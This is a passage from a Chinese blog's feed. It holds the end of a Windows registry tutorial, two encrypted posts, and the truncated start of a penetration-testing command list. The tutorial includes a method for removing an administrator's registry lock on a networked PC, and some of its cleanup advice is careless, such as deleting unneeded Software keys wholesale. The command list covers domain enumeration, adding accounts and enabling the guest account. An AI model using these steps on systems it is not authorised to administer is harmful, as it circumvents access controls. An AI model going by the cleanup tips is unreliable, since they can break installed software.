id="二、注册表导出法导出注册表"><a href="#二、注册表导出法导出注册表" class="headerlink" title="二、注册表导出法导出注册表"></a>二、注册表导出法导出注册表</h3><p>​在文件中选择导出命令,回答文件名和位置，OK了</p><h3 id="三、通过系统备份功能进行备份"><a href="#三、通过系统备份功能进行备份" class="headerlink" title="三、通过系统备份功能进行备份"></a>三、通过系统备份功能进行备份</h3><p>​1、选择开始—程序—附件—系统工具—备份</p><p>​2、选择高级模式点下一步</p><p>​3、选择system state(系统状态),在底下文件名中位置中回答路径及文件名</p><p>​4、点击开始备份</p><h2 id="第十一课-恢复注册表"><a href="#第十一课-恢复注册表" class="headerlink" title="第十一课  恢复注册表"></a>第十一课  恢复注册表</h2><p>1、重新启动系统恢复注册表</p><p>​ 一重启就可以修正各种在注册表中出现的错误了，但是以硬盘上的注册表的信息正确为前提的。</p><p>2、手工恢复注册表</p><p>​把上节中复制出来的文件再弄回去就OK了。</p><p>3、注册表导入法恢复</p><p>​首先上节中的导出的文件你要有啊，然后运行regedit.exe文件，文件中的导入，选择要导入的注册表文件，点找开就可以了</p><p>4、利用高级启动选项恢复注册表</p><p>​重启计算机，启动时按F8键进入高级选项菜单， 选择最后一次正确的配置，回车了，OK</p><p>5、通过局域网来恢复注册表</p><pre><code> 这个我们一般是指连入局域网的某一计算机（我们假设叫aaaaa）的注册表被管理员锁了，但有另一台计算机（我们假设叫B）的注册表可以用，现在我们用B来解除A的锁定。</code></pre><p>​进入B的注册表，选择文件中的连接网络注册表，在查找位置中输入aaaaa，这时注册表中出现了songxiang计算机的注册表，</p><p>​修改键值：aaaaa\HEKY_USERS\S-1-5-21-823518204-688789844-842925246-500\Software\Microsoft\</p><p>Windows\CurrentVersion\Policies\System下的disableregistrytools值改为0就可以了。</p><p>​S-1-5-21-823518204-688789844-842925246-500这一大堆数知道什么意思吗，是超级管理员，重新安装系统</p><h2 id="第十二课-注册表的优化"><a href="#第十二课-注册表的优化" class="headerlink" title="第十二课  注册表的优化"></a>第十二课  注册表的优化</h2><h3 id="一、我们为什么要优化注册表"><a href="#一、我们为什么要优化注册表" class="headerlink" title="一、我们为什么要优化注册表"></a>一、我们为什么要优化注册表</h3><p>1、在计算机使用过程中可能经常添加或删除应用程序；在上网时遇到恶意网站，向注册表强行添加信息；</p><p>2、原来的应用程序卸载后注册表没删除，启动时出现没找到某某应用程序</p><p>3、多余注册表的子项可能造成浪费或降低启动速度</p><h3 id="二、手工优化注册表"><a href="#二、手工优化注册表" class="headerlink" title="二、手工优化注册表"></a>二、手工优化注册表</h3><p>1、清除多余的DLL文件<br>大家找到这个项：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\ShareDLLs，在这个项下存放的是共享的DLL信息，注意看括号里面的数据，它表示共享文件的数目，如果为0，那么删除掉吧</p><p>2、安装卸载应用程序的垃圾信息<br>这个主要是一些非法卸载应用程序导致的，我们首先要知道什么程序被非法卸载了，这个很好办，你自己现在正使着的你是知道的，其余的就没用了<br>注册表位置：HKEY_CURRENT_USER\Software HKEY_LOCAL_MACHINE\Software看到没用的就全删了就行了</p><p>3、系统安装时产生的无用信息：去掉吧，有可能启动变快呢</p><p>​3.1、删除多余时区（我是只留北京时区）<br>​位置：HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\CurrentVersion\Time Zones<br>​如果你只要北京时区的话，那么除了China Standard Time，其余的都删了吧</p><p>​3.2、清除国家列表（我只留中华人民共和国）<br>​位置：HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Telephony\Country List<br>​保留86号文件夹，其余删</p><p>​3.3、清除多余的语言代码（我只保留英语—0409和中文—0804）<br>​位置：HKEY_LOCAL_MACHINE\SYSTEM\CurrnetControlSet\Control\Nls\Locale没用的删了吧</p><p>​3.4、删除多余的键盘布局：<br>​位置：HKEY_LOCAL_MACHINE\SYSTEM\CurrnetControlSet\Control\Keyboard Layouts<br>​你可以把每个键值都打开看看，不需要的输入法删除即可</p><p>​3.5、删除失效的文件关联<br>​位置：HKEY_CLASSES_ROOT主键可分为两部分：第一部分用来定义文件类型；第二部分与第一部分一一对应，用于记录打开文件的应用程序。一般，在打开第二部分的可疑子项后，若该键下的COMMAND下没有内容，就可以删掉了</p><h2 id="第十三课-个性化设置"><a href="#第十三课-个性化设置" class="headerlink" title="第十三课  个性化设置"></a>第十三课  个性化设置</h2><p>1、去掉桌面快捷方式上的小键头<br>位置：HKEY_CLASSES_ROOT\LNKFILE项 ：IsShortcut<br>操作：删除此项</p><p>2、隐藏桌面上的所有图标<br>位置：HKEY_CURRENT_USER\Software\Windows\CurrentVersion\Policies\Explorer<br>新建：NoDesktop（双字节）<br>操作：值设为1</p><p>3、修改桌面上“回收站”的名字及图标位置：<br>HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID{645FF040-5081-101B-9F08-00AA002F954E}（这个大家也可直接查找“回收站”<br>修改：（默认）一项随便换个名字就可以了<br>然后展开此项，选择DEfaultIcon<br>这时大家看到有3个子项，意思吗一看就明白了<br>如果想改变图标时，只需将路径和文件名改了即可，比如改为”d:\tt.ico”</p><p>4 、去掉桌面上的网上邻居<br>位置：HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer<br>新建：NoNetHood（双字节）值： 1</p><p>5、在桌面上显示系统版本号<br>位置：HKEY_CURRENT_USER\Control Panel\Desktop<br>项：PaintDesktopVersion<br>修改：将值改为1</p><p>6、改变窗口按钮字体的颜色<br>位置：HKEY_CURRENT_USER\Control Pannel\Colors<br>键值：ButtonText<br>修改：大家知道PS吧，比如改为红么(255,0,0)</p><p>7、屏蔽桌面上的IE图标<br>位置：HKEY_CURRENT_USER\Software\Windows\CurrentVersion\Policies\Explorer<br>新建值项：NoInternetIcon<br>修改：1</p><p>8、禁止更改桌面墙纸<br>位置：HKEY_CURRENT_USER\Software\Windows\CurrentVersion\Policies\Explorer<br>新建项值：NoChangingWallPaper(双字节）<br>修改：1</p><p>9、设置登录背景<br>位置：HKEY_USERS\DEFAULT\ControlPanel\Desktop<br>键值：WallPaper<br>修改：把背景图片一写就OK了（比如C:\aa.bmp）<br>—————-以上需重启计算机—————-</p><p>10、更改：我的电脑的提示信息位置：<br>HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID{20D04FE0-3AEA-1069-A2D8-08002B30309D}<br>键值：InfoTip<br>修改：哈，随便打吧，我打成了“这是我的电脑噢”</p><p>11、更改：回收站的提示信息位置：<br>HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID{645FF040-5081-101B-9F08-00AA002F954E}<br>键值：InfoTip<br>修改：跟上面一样,自己改吧</p><p>12、更改IE的提示信息位置：<br>HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID{871C5380-42A0-1069-A2EA-08002B30309D}<br>键值：InfoTip<br>修改：同上</p><p>13、更改网上邻居的提示信息位置：<br>HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID{208D2C60-3AEA-1069-A2D7-08002B30309D}<br>键值：InfoTip<br>修改：同上</p><p>14、更改我的文档的提示信息位置：<br>HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID{450D8FBA-AD25-11D0-98A8-0800361B1103}<br>键值：InfoTip<br>修改：同上</p><p>15、更改任务计划提示信息位置：<br>HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID{D6277990-4C6A-11CF-8D87-00AA0060F5BF}<br>键值：InfoTip<br>修改：同上</p><p>16、改变桌面图标顺序位置：<br>HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID{450D8FBA-AD25-11D0-98A8-0800361B1103}<br>键值：SortOrderIndex<br>修改：48（我的文档在第一位）<br>54（我的电脑在第一位）</p><p>17、禁止帮助提示信息(需重启）<br>位置：HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced<br>键值：showinfotip<br>修改：0</p><p>18、用真彩色显示图标(需重启）<br>位置：HKEY_CURRENT_USER\Control<br>Panel\Desktop\WindowMetrics<br>键值：Shell Icon BPP<br>修改：32</p><p>19、更改图标显示尺寸(需重启）<br>位置：HKEY_CURRENT_USER\Control Panel\Desktop\WindowMetrics<br>键值：Shell Icon SIZE<br>修改：在显示器分辨率为1024<em>768时可改为：48；在显示器分辨率为1600</em>1200时可改为：64</p><p>20、自动清除“文档”菜单中的历史记录（需重启）<br>位置：HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer<br>新建：CleanReccentDocsOn-Exit<br>(REG-DWORD)值：1</p><p>21、禁止“文档”的历史记录（需重启）<br>位置：HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer<br>新建：NoReccentDocsHistory<br>(REG-DWORD)值：1</p><p>22、去掉开始菜单的“文档”项（需重启）<br>位置：HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer<br>新建：NoReccentDocsMenu<br>(REG-DWORD)值：1</p><p>23、去掉开始菜单的“查找”项（需重启）<br>位置：HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer<br>新建：NoFind<br>(REG-DWORD)值：1</p><p>24、去掉开始菜单的“运行”项（需重启）<br>位置：HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer<br>新建：NoRun<br>(REG-DWORD)值：1</p><p>25、禁止用户更改“开始”菜单（需重启）<br>位置：HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer<br>新建：NoChangeStartMenu<br>(REG-DWORD)值：1</p><p>26、禁止显示开始菜单中的windows update项（需重启）<br>位置：HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer<br>新建：NoWindowsUpdate<br>(REG-DWORD)值：1</p><p>27、屏蔽开始菜单中的“关闭计算机”项（需重启）<br>位置：HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer<br>新建：NoClose (REG-DWORD)值：1</p><p>28、加快“开始”菜单与“任务栏”的速度<br>位置：HKEY_CURRENT_USER\Control Panel\Desktop<br>键值：MenuShowDelay<br>值：数值资料改为100或更小（默认值为：400），建议不要使用0，因为如此一来只要鼠标一不小心触碰到“所有程序”，整条菜单就会跑出来，那这乱了套。</p><p>29、为回收站的右键菜单增加“删除”和“重命名”<br>位置：HKEY_CLASSES_ROOT\CLSID{645FF040-5081-101B-9F08-00AA002F954E}\ShellFolder<br>键值：Attributes<br>值：70 01 00 20</p><p>30、为右键菜单添加“在新窗口打开”命令<br>位置：HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\shell<br>新建子项：NewWindow<br>修改：将默认值项值改为“在新窗口打开”<br>继续：在NewWindow项下新建个子项command<br>修改：将默认值项值改为explorer.exe</p><p>31、为右键菜单添加“快速关闭计算机”命令<br>位置：HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\shell<br>新建子项：<br>快速关闭计算机<br>修改：将默认值项值改为“快速关闭计算机”<br>继续：在NewWindow项下新建个子项command<br>修改：将默认值项值改为”c:\windows\rundll32.exe user.exe,exitwindowsexec”</p><p>32、禁止任务栏的快捷菜单（需重启)<br>位置：HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer<br>新建键值：NoTrayContextMenu<br>(REG_DWORD)值：1</p><p>33、将任务栏显示时间的地方改为要显示的文字（需重启）<br>位置：HKEY_CURRENT_USER\Control Panel\International<br>键值：STimeFormat<br>修改：自己喜欢什么文字就改成什么吧</p><p>34、禁止使用任务栏（需重启）<br>位置：HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer<br>新建键值：NoSetTaskBar<br>(REG_DWORD)修改：1</p><h2 id="第十四课-系统设置-控制面板常用选项设置，系统性能优化设置"><a href="#第十四课-系统设置-控制面板常用选项设置，系统性能优化设置" class="headerlink" title="第十四课  系统设置(控制面板常用选项设置，系统性能优化设置)"></a>第十四课  系统设置(控制面板常用选项设置，系统性能优化设置)</h2><p>1、禁用“控制面板”中的“显示”选项<br>位置：HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies<br>新建项值：System<br>新建值项：NodispCPL<br>（REG_DWORD）<br>值：1</p><p>2、屏蔽显示选项中的“屏幕保护程序”<br>位置：HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System<br>新建值项：NoDispScrSavPage<br>   （REG_DWORD）<br>值：1</p><p>3、屏蔽显示选项中的“外观”<br>位置：HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System<br>新建值项：NoDispAppearancePage<br>   （REG_DWORD）值：1</p><p>4、屏蔽显示选项中的“设置”<br>位置：HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System<br>新建值项：NoDispSettingsPage<br>   （REG_DWORD）值：1</p><p>5、屏蔽显示选项中的“屏幕保护程序密码”<br>位置：HKEY_CURRENT_USER\Software\Policies\Microsoft<br>新建项：Control Panel<br>再新建子项：Desktop<br>新建值：ScreenSaverIsSecure (REG_DWORD)值：1</p><p>6、禁止使用“添加删除程序”项<br>位置：HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies<br>新建子项：Uninstall<br>新建值项：NoAddRemovePrograms (REG_DWORD)值：1</p><p>7、屏蔽“添加删除程序”中的“更改或删除程序”选项<br>位置：HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\uninstall<br>新建值项：NoRemovePage  (REG_DWORD)值：1</p><p>8、屏蔽“添加删除程序”中的“添加新程序”选项<br>位置：HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\uninstall<br>新建值项：NoAddpage (REG_DWORD)值：1</p><p>9、屏蔽“添加删除程序”中的“添加或删除windows组件”选项<br>位置：HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\uninstall<br>新建值项：NoWindowsSetupPage (REG_DWORD)值：1</p><p>10、屏蔽“添加删除程序”中的“更改或删除程序”中的“单击此处获得支持信息”选项<br>位置：HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\uninstall<br>新建值项：NoSupportInfo (REG_DWORD)值：1</p><p>11、屏蔽“更改或删除程序”中的“添加新程序”中的“从CD-ROM或软盘安装程序”选项<br>位置：HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\uninstall<br>新建值项：NoAddFromCDorFloppy (REG_DWORD)值：1</p><p>12、屏蔽“更改或删除程序”中的“添加新程序”中的“从Microsoft添加程序程序”选项<br>位置：HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\uninstall<br>新建值项：NoAddFromInternet (REG_DWORD)值：1</p><p>13、设置windows的关机时间<br>位置：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control<br>值项：WaitToKillServiceTimeout<br>修改：它以毫秒为单位，请自行设置</p><p>14、更改windows服务启动的顺序<br>位置：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ServiceGroupOrder<br>值项：ServiceGroupOrder<br>修改：按你想要的顺序自行输入</p><p>15、更改windows启动时运行的程序<br>位置：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session<br>Manager<br>值项：BootExecite<br>修改：自行输入一行启动时要执行的命令即可</p><p>16、删除多余的DLL文件<br>位置：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\SharedDlls<br>值项：这里好多了，都是DLL的，注意看好了，所有是0的都是没用的，删了即可，然后再将相应的系统文件夹中的文件删除</p><p>17、删除不必要的自启程序<br>位置：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run<br>值项：这里面列出的都是启动项，不要的可以删掉，他和msconig中列出的是一样的</p><p>18、清除注册表垃圾（需重启）<br>位置1：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall<br>位置2：HKEY_LOCAL_MACHINE\SOFTWARE<br>操作：很简单了，没用的删了吧</p><p>19、自动刷新窗口（需重启）<br>位置：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Update<br>键值：UpdateMode<br>修改：0</p><p>20、更改开始菜单存放的目录（需重启）<br>位置：HKEY_USERS.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders<br>键值：Start Menu<br>修改：把要改到的路径添上就可以了,并将原源件复制到目标文件夹下</p><p>21、更改开始菜单中的程序的存放目录（需重启）<br>位置：HKEY_USERS.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders<br>键值：Program<br>修改：把要改到的路径添上就可以了，并将原源件复制到目标文件夹下</p><p>22、更改开始菜单中的程序里的应用程序存放目录（需重启）<br>位置：HKEY_USERS.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders<br>键值：appdate<br>修改：把要改到的路径添上就可以了，并将原源件复制到目标文件夹下</p><p>23、更改开始菜单中的程序里的发送到存放目录（需重启）<br>位置：HKEY_USERS.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders<br>键值：SendTo<br>修改：把要改到的路径添上就可以了，并将原源件复制到目标文件夹下,其实我们也可以在这里建立一个新的发送到项目，比如发送到你的U盘</p><p>24、更改开始菜单中的程序里的启动程序存放目录（需重启）<br>位置：HKEY_USERS.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders<br>键值：StartUp<br>修改：把要改到的路径添上就可以了，并将原源件复制到目标文件夹下</p><p>25、更改网页历史记录存放目录（需重启）<br>位置：HKEY_USERS.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders<br>键值：History<br>修改：把要改到的路径添上就可以了，并将原源件复制到目标文件夹下</p><p>26、更改我的文档存放目录（需重启）<br>位置：HKEY_USERS.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders<br>键值：Personal<br>修改：把要改到的路径添上就可以了，并将原源件复制到目标文件夹下</p><p>27、更改新建文件的存放目录（需重启）<br>位置：HKEY_USERS.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders<br>键值：Templates<br>修改：把要改到的路径添上就可以了</p><p>28、在我的电脑中显示网络连接<br>位置：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace<br>新建子项：{992CFFA0-F557-101A-88EC-00DD010CCC48}<br>修改默认值：网络连接</p><p>29、在我的电脑中显示打印机和传真<br>位置：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace<br>新建子项：{2227A280-3AEA-1069-A2DE-08002B3039D}<br>修改默认值：打印机和传真</p><p>30、打开或关闭启动优化功能（启动时碎片整理）<br>位置：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Dfrg\BootOptimizeFunction<br>键值：Enable<br>修改：Y开启N不开启</p><p>31、加快程序运行速度(需要重启)<br>位置：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem<br>新建值项：configfileallocsize<br>值：1f4</p><p>32、缩短关闭无响应程序的等待时间（需重启）<br>位置：HKEY_USERS.DEFAULT\Control Panel\Desktop<br>值项：WaitToKillTimeout<br>修改：增大一点可以加快处理程序的速度</p><p>33、关机时自动删除交换文件<br>位置：HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Session Manager\Memory Management<br>值：ClearPageFileAtShutdown<br>修改：1</p><p>34、自动关闭计算机（指关机后停在关机界面）<br>位置：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows<br>NT\CurrentVersion\Winlogon<br>值：PowerdownAfterShutdown<br>修改：1</p><h2 id="第十五课-硬件设置"><a href="#第十五课-硬件设置" class="headerlink" title="第十五课  硬件设置"></a>第十五课  硬件设置</h2><p>1、启用CPU的二级缓存（需重启）<br>位置：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management<br>值项：secondleveldatacache<br>修改：我改成了200了，你呢</p><p>2、修改认证标识（拥有个性化的CPU）<br>位置：HKEY_LOCAL_MACHINE\HARDWARE\DEscriptION\System\CentralProcessor\0<br>值项：ProcessorNameString<br>修改：随便改，改成了奔8CPU,9.99GHZ主频</p><p>3、更改系统属性对话框里的CPU信息<br>位置：HKEY_LOCAL_MACHINE\HARDWARE\DEscriptION\System\CentralProcessor\0<br>值项：VendorIdentifer<br>修改：随便改</p><p>4、清除内存中不使用的DLL文件（需重启）<br>位置：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer<br>新建值项：Always UnloadDll<br>(REG-DWORD)值：1</p><p>5、启动自动优化磁盘功能（需重启）<br>位置：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Dfrg\BootOptimizeFunction<br>值项：Enable<br>修改：Yes</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Windows注册表内容详解&quot;&gt;&lt;a href=&quot;#Windows注册表内容详解&quot; class=&quot;headerlink&quot; title=&quot;Windows注册表内容详解&quot;&gt;&lt;/a&gt;Windows注册表内容详解&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;原文链接：&lt;a href=&quot;</summary>
      
    
    
    
    <category term="计算机基础知识" scheme="https://w-sqrt7.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="转载" scheme="https://w-sqrt7.github.io/tags/%E8%BD%AC%E8%BD%BD/"/>
    
    <category term="基础" scheme="https://w-sqrt7.github.io/tags/%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>WEB攻防</title>
    <link href="https://w-sqrt7.github.io/2024/03/16/web/WEB%E6%94%BB%E9%98%B2/"/>
    <id>https://w-sqrt7.github.io/2024/03/16/web/WEB%E6%94%BB%E9%98%B2/</id>
    <published>2024-03-16T08:30:04.900Z</published>
    <updated>2024-03-28T14:16:47.508Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="9e4e38f1cfc751eb04464d8ac8018631ac4d8d4fede31fb8a6eb110746fb1967">e05d9ee6e48268b2b742c6d6f1681d6164fa5aa1dc52a0c978370e90ed17c302880c189753220d6d366cb0b202107534f7df93832ae7837c9481ea8d11ef56de293c21648b070c4d3e28e11261bf58633759dd8ad7574054e05c72884ea6a427f03ec09de739740099c545b5cc795bc6cd6a259696121ea68821460b98d950add84a29d4ae393693d6670f4b4fb6f98c4d002039f678df96af3680a0516a9841c19eaeee5c18dabb0a4a34ef885294556862298c9374105fa542cd23c263b49f6a2b340d198f8f11d2747373455b0aa6a066395cdde01f56436df9f631c773524a8c55122fba64fd29f9cade36e325428b9e140f9824014fa81260e542676250561d0535320fad54f1f84925eeb14051e70f4327fa01461ac8bfac09a951df44045eafd43f92d98fc39a75707f2ac494d8be9bfde894b489aa9075c35384c903c691ec9cc95c809e7b7fff1131c23bb95b5a4b340babaeedaf0c790710b44668e13bb2bfd6a482c62d177c2a5e7f01fc5147199df63a393551c0ee3dad616edfea5c9be9c7c20fcb23f9e0f0f2dfd06a65a8c2077522c4c64ca1c091f2d06fe61236fb62f5442819627a97449cff20e35d9f0e86995b27db7ef699b74f5864459fd9baeca391607e73894ee90a34317b67d1997a638979d454b9fc301f0b08bf155b15651033d026cb6a56774ffa98528075f64a7c36bba6a883b8037d72dc27c83cac4f6ba304fd510eb5e0c2d950fbee8c107b2a02f93473466fe1b3e8c43e61bacab8fe1cfebcf3f3ddc96ce56f43e02dff7af255d8884e73fe05d351d647e5f0536190f8340d8f5d6b754083dc3a6a3ef150b62ec6dd28952d467f80248f690f74fef3c692530e9337086a27c187f0095f07b38c86e1598f291b360c7c37552014f93c04eac6ed71cd3176c97c797c9a19d1821f2b96d87d2b4d1c99bb3a42e610d3da1030b752f3439afcee09c9eceec1e3af8e95bd14f29709517b6e80411f1a1dced11b58c29b9fa52c4ad926d78f788c9d6dab3a1ea021249656228a9ef5f9af6fd213ce9a934fbe28e5462efe93c8e6e156c31e800da658f5c17eaac8742584606f2db4129da989ae0ef1cc4913f6cfba3e9f6abdf309e1df15050aaf9b6a7a4ca50a79221dc4890a6d03bc40c61d9e5d3b9c65cb38f1fc17abc711a22b5810c349b241fe5a150dec1aedf2ee9fd5430f1836b2589f7ba7d32c2a50c28a507cfca3e51d68491e7fe0b89b1b6b7c04f894b8d1dc786e0ed3b9ddc0182a5c4b79b51e4577d6883e8fdaaaf13d55e015347edaff18fbc1fff820a678ec1b3c575afbe774fa679c00cdb4443dc1e6d3ab2e5520081d072b0036db2bbb6e4b2c8b5869b7d0f85196f9e3dda034015eac7fab507cd6d691cc364e5866dbeaed7ebd17a84c91c3c699bce3ce2b324f4443373baadfd438a12b6f91d49509c10ffd81d76bb23f0d3fa19a79c0439ab6</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">有东西被加密了, 请输入密码查看.</summary>
    
    
    
    <category term="笔记" scheme="https://w-sqrt7.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="web总结" scheme="https://w-sqrt7.github.io/categories/%E7%AC%94%E8%AE%B0/web%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="原创" scheme="https://w-sqrt7.github.io/tags/%E5%8E%9F%E5%88%9B/"/>
    
    <category term="web" scheme="https://w-sqrt7.github.io/tags/web/"/>
    
    <category term="渗透" scheme="https://w-sqrt7.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>滴水逆向—汇编笔记</title>
    <link href="https://w-sqrt7.github.io/2024/03/11/dishui-note/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91%E2%80%94%E6%B1%87%E7%BC%96%E7%AC%94%E8%AE%B0/"/>
    <id>https://w-sqrt7.github.io/2024/03/11/dishui-note/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91%E2%80%94%E6%B1%87%E7%BC%96%E7%AC%94%E8%AE%B0/</id>
    <published>2024-03-11T09:10:42.483Z</published>
    <updated>2024-03-18T07:04:48.488Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="930ad6491fb2b85193ad49593f18971bee64d900c4a3d343474f674cabed59b7"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">有东西被加密了, 请输入密码查看.</summary>
    
    
    
    <category term="笔记" scheme="https://w-sqrt7.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="滴水逆向" scheme="https://w-sqrt7.github.io/categories/%E7%AC%94%E8%AE%B0/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91/"/>
    
    
    <category term="原创" scheme="https://w-sqrt7.github.io/tags/%E5%8E%9F%E5%88%9B/"/>
    
    <category term="逆向" scheme="https://w-sqrt7.github.io/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="汇编" scheme="https://w-sqrt7.github.io/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>Windows渗透测试中常用命令</title>
    <link href="https://w-sqrt7.github.io/2024/03/09/other/basic/Windows%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <id>https://w-sqrt7.github.io/2024/03/09/other/basic/Windows%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</id>
    <published>2024-03-09T07:58:06.817Z</published>
    <updated>2024-03-09T07:59:01.441Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Windows渗透测试中常用命令"><a href="#Windows渗透测试中常用命令" class="headerlink" title="Windows渗透测试中常用命令"></a>Windows渗透测试中常用命令</h1><p>ifconfig &#x2F;all 获取获取域名、IP地址、DHCP服务器、网关、MAC地址、主机名<br>dir 查看目录<br>type 查看文件内容<br>net time &#x2F;domain 查看域名、时间<br>net view &#x2F;domain 查看域内所有共享<br>net view ip 查看对方局域网内开启了哪些共享<br>net config workstation 查看域名、机器名等<br>net user 用户名 密码 &#x2F;add 建立用户<br>net user 用户名 &#x2F;del #删除用户<br>net user guest &#x2F;active:yes 激活guest账户<br>net user 查看账户<br>net user 账户名 查看指定账户信息<br>net user &#x2F;domain 查看域内有哪些用户，Windows NT Workstation 计算机上可用，由此可以此判断用户是否是域成员。<br>net user 用户名 &#x2F;domain 查看账户信息<br>net group &#x2F;domain 查看域中的组<br>net group “domain admins” &#x2F;domain 查看当前域的管理用户<br>query user 